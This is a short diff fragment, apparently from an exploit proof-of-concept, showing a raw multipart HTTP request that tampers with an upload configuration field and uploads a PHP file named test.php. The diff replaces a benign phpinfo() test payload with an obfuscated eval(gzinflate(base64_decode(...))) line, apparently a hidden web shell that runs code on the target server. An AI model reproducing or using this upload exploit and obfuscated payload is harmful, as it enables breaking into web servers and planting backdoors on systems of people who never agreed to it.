@@ -127,7 +127,8 @@ Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
 Content-Disposition: form-data; name="ffff"; filename="test.php"
 Content-Type: application/octet-stream
 
-<?php phpinfo();?>
+<?PHP
+eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?>
 -----------------------------55719851240137822763221368724
 Content-Disposition: form-data; name="mufile"
 
